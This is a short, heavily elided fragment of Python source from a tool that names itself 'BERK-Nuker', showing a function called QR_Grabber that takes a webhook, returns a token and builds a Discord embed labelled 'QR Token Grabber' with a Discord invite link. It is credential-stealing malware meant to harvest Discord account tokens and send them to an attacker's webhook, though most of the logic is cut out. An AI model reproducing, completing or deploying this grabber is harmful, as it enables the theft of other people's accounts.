...
def QR_Grabber(Webhook):
    ...
    if sys.argv[0].endswith(".exe"):
        print(f'\n[\x1b[95m>\x1b[95m\x1B[37m] Opening Another BERK-Nuker File')
        try:
    ...
    return token;
            ...
            embed = {
                ...
                "embeds": [
                    {
                        "author": {
                            "name": "BERK-Nuker | QR Token Grabber",
                            "url": "https://discord.gg/3HvmaUxRv9",
                        ...
                        "footer": {
                          "text": "https://discord.gg/3HvmaUxRv9"
                        }
                    }
                ]
            }
